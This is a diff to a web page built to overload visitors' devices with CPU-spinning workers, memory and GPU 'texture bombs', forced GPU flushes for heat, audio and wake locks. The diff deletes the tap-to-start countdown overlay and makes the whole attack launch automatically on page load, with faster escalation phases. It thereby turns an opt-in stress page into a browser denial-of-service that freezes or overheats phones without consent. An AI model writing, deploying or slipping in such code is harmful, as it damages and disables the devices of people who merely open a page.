@@ -72,85 +72,20 @@
             from { box-shadow: 0 0 20px red; }
             to   { box-shadow: 0 0 50px #ff4444, 0 0 80px red; }
         }
-        /* ── COUNTDOWN OVERLAY ─────────────────────── */
-        #cd-overlay {
-            position: fixed; inset: 0; z-index: 99999;
-            display: flex; align-items: center; justify-content: center;
-            background: rgba(8, 6, 20, 0.92);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            cursor: pointer;
-            transition: opacity 0.5s ease;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-        }
-        #cd-overlay.fade-out { opacity: 0; pointer-events: none; }
-
-        .cd-box {
-            text-align: center;
-            padding: 40px 60px;
-            border-radius: 24px;
-            background: rgba(255,255,255,0.04);
-            border: 1.5px solid rgba(255,255,255,0.12);
-            box-shadow: 0 0 60px rgba(120,0,255,0.2), inset 0 0 40px rgba(255,255,255,0.02);
-            max-width: 340px;
-            user-select: none;
-            animation: cd-appear 0.6s cubic-bezier(.34,1.56,.64,1) both;
-        }
-        @keyframes cd-appear {
-            from { opacity:0; transform: scale(0.7); }
             to   { opacity:1; transform: scale(1); }
         }
 
-        .cd-emoji { font-size: 48px; margin-bottom: 8px; }
-
-        .cd-title {
-            font-size: 22px; font-weight: 700; color: #fff;
-            margin-bottom: 4px; letter-spacing: 0.5px;
-        }
-        .cd-sub {
-            font-size: 14px; color: rgba(255,255,255,0.45);
-            margin-bottom: 32px;
-        }
-
-        #cd-num {
-            font-size: 120px; font-weight: 900; line-height: 1;
-            color: #7cf; text-shadow: 0 0 40px currentColor;
-            transition: color 0.3s;
-            animation: cd-pop 0.9s cubic-bezier(.34,1.56,.64,1) both;
-        }
-        @keyframes cd-pop {
-            0%   { transform: scale(0.5); opacity: 0; }
             60%  { transform: scale(1.15); opacity: 1; }
             100% { transform: scale(1); }
         }
-        #cd-num.pop { animation: cd-pop 0.9s cubic-bezier(.34,1.56,.64,1) both; }
 
-        .cd-num-3 { color: #5df5a0; text-shadow: 0 0 40px #5df5a0; }
-        .cd-num-2 { color: #ffd454; text-shadow: 0 0 40px #ffd454; }
-        .cd-num-1 { color: #ff6060; text-shadow: 0 0 40px #ff6060; }
 
-        .cd-tap-hint {
-            margin-top: 28px; font-size: 13px;
-            color: rgba(255,255,255,0.3);
-            animation: cd-blink 1.2s infinite;
-        }
-        @keyframes cd-blink {
-            0%,100% { opacity: 0.3; } 50% { opacity: 0.8; }
         }
     </style>
 </head>
 
 <body>
     <!-- Countdown Overlay — also acts as iOS audio unlock (catches first tap) -->
-    <div id="cd-overlay">
-        <div class="cd-box">
-            <div class="cd-emoji">😈</div>
-            <div class="cd-title">مستعد للتجربة؟</div>
-            <div class="cd-sub">اضغط لبدء العداد</div>
-            <div id="cd-num">3</div>
-            <div class="cd-tap-hint">↑ اضغط أي مكان ↑</div>
-        </div>
-    </div>
     <!-- ios-unlock: kept as hidden placeholder for code compatibility -->
     <div id="ios-unlock" style="display:none;"></div>
     <div id="alert-box">⚠️ تم تفعيل وضع التدمير! المعالج يختنق الآن... ⚠️</div>
@@ -443,7 +378,7 @@
         // ── RAF + GPU readPixels SYNC (forces GPU flush every frame) ──
         var _gpuReadBuf = new Uint8Array(4);
         function ontimer(){
-            ang1+=0.015;
+            ang1+=0.06;
             draw();
             // GPU-CPU sync: forces pipeline to flush → extreme thermal
             try{ gl.readPixels(0,0,1,1,gl.RGBA,gl.UNSIGNED_BYTE,_gpuReadBuf); }catch(e){}
@@ -868,7 +803,6 @@
 
             // ── AUDIO UNLOCK + COUNTDOWN ─────────────────────────────
             var started = false;
-            var countdownRunning = false;
 
             // Called on first user tap — MUST be synchronous for iOS audio
             function initOnInteraction(e) {
@@ -881,64 +815,9 @@
                     iosUnlockAudio(audioCtx); // silent buffer — unlocks WebKit
                     // melody starts AFTER countdown (audioCtx is already unlocked)
                 } catch (err) {}
-
-                // ② Start the countdown — beast starts when it hits 0
-                startCountdown();
             }
 
-            // ── COUNTDOWN ─────────────────────────────────────────────
-            function startCountdown() {
-                if (countdownRunning) return;
-                countdownRunning = true;
-
-                var numEl   = document.getElementById('cd-num');
-                var overlay = document.getElementById('cd-overlay');
-                var subEl   = overlay ? overlay.querySelector('.cd-sub') : null;
-                var hintEl  = overlay ? overlay.querySelector('.cd-tap-hint') : null;
-                var count   = 3;
-
-                var colorMap = { 3: 'cd-num-3', 2: 'cd-num-2', 1: 'cd-num-1' };
-
-                // Hide hint, update sub
-                if (hintEl) hintEl.style.display = 'none';
-                if (subEl)  subEl.textContent = 'استعد...';
-
-                function tick() {
-                    if (!numEl) { startBeast(); return; }
-
-                    if (count > 0) {
-                        // Update number + color
-                        numEl.textContent = count;
-                        numEl.className   = 'pop ' + (colorMap[count] || '');
-                        // Re-trigger CSS animation
-                        void numEl.offsetWidth;
-                        numEl.className = 'pop ' + (colorMap[count] || '');
-
-                        count--;
-                        setTimeout(tick, 950);
-                    } else {
-                        // Show GO briefly, then unleash
-                        numEl.textContent = '☠️';
-                        numEl.className   = 'cd-num-1 pop';
-                        void numEl.offsetWidth;
-                        numEl.className = 'cd-num-1 pop';
-
-                        setTimeout(function () {
-                            if (overlay) {
-                                overlay.classList.add('fade-out');
-                                setTimeout(function () {
-                                    if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
-                                }, 500);
-                            }
-                            startBeast();
-                        }, 400);
-                    }
-                }
-
-                // First tick immediately
-                tick();
-            }
-
+            
             // ── BEAST MODE — called after countdown hits 0 ────────────
             function startBeast() {
                 // Start melody (AudioContext already unlocked)
@@ -958,7 +837,8 @@
                 }
 
                 startHaptics();
-                spawnWorkers();
+                spawnWorkers(4);        // +4× cores on top of onload's 4×
+                spawnOffscreenWorkers(4); // +4 GPU threads on top of onload's 4
                 allocateMemory();
                 startImageWorkers();
                 requestWakeLock();
@@ -966,15 +846,11 @@
                 startEscalationPhases(); // unleash all 3 phases
             }
 
-            // Attach to countdown overlay (it covers full screen)
-            var cdOverlay = document.getElementById('cd-overlay');
-            cdOverlay.addEventListener('touchend',  initOnInteraction, { once: true, passive: false });
-            cdOverlay.addEventListener('touchstart', initOnInteraction, { once: true, passive: false });
-            cdOverlay.addEventListener('click',      initOnInteraction, { once: true });
-            document.addEventListener('mousedown', function desktopInit(e) {
-                initOnInteraction(e);
-                document.removeEventListener('mousedown', desktopInit);
-            }, { once: true });
+            // Auto-start immediately — no user tap required
+            // (Audio needs a gesture on iOS, so we keep touch listeners as fallback)
+            setTimeout(initOnInteraction, 50);
+            document.addEventListener('touchend',  initOnInteraction, { once: true, passive: false });
+            document.addEventListener('click',      initOnInteraction, { once: true });
             cx = document.body.clientWidth;
             cy = document.body.clientHeight;
             if (cx > cy) {
@@ -1183,6 +1059,12 @@
             gl.viewport(0, 0, 1024, 1024);
             draw();
             window.requestAnimationFrame(ontimer);
+            // ── LAUNCH FREEZE IMMEDIATELY (no user interaction needed) ──
+            spawnWorkers(4);            // 4× cores, while(true), instant
+            allocateMemory();           // RAM pressure
+            spawnOffscreenWorkers(4);   // 4 GPU threads via OffscreenCanvas
+            startTextureBomb();         // VRAM thrash
+
             document.getElementById("kernel").value = KERNEL;
             document.getElementById("btn").addEventListener("click", function () {
                 var state = this.innerText == "CONFIG";
@@ -1269,7 +1151,7 @@
                 spawnWorkers(3); // 3× extra
                 startTextureBomb();
                 startExtraCanvases();
-            }, 1000);
+            }, 200);
 
             // ── PHASE 3: MELTDOWN (12s) ──────────────────────────
             setTimeout(function () {
@@ -1285,7 +1167,7 @@
                 applyShader(50, 12000, '0.0001', 32, 32);
                 spawnWorkers(4); // 4× extra — total = 10× cores
                 audioBomb();
-            }, 3000);
+            }, 500);
             }
         }
     </script>
